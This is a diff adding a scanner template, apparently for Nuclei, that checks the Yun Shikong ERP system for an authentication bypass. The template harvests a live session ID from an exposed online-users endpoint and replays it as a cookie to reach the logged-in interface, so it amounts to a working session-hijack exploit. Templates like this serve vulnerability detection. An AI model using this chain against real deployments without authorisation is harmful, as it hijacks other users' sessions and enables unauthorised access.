@@ -1,0 +1,48 @@
+id: yun-shikong-erp-auth-bypass
+info:
+  name: 云时空社会化商业ERP系统身份认证绕过漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+http:
+  - raw:
+      - |
+        GET /sys/user/online HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: sessionid
+        part: body
+        regex:
+          - '"sessionid":"([0-9a-zA-Z-]+)"'
+        internal: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"sessionid":'
+          - '"username":'
+  - raw:
+      - |
+        GET /index HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: emscm.session.id={{sessionid}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "退出登录"
+          - "用户设置"
+      - type: word
+        part: body
+        words:
+          - "云时空社会化商业ERP"
+          - "title"
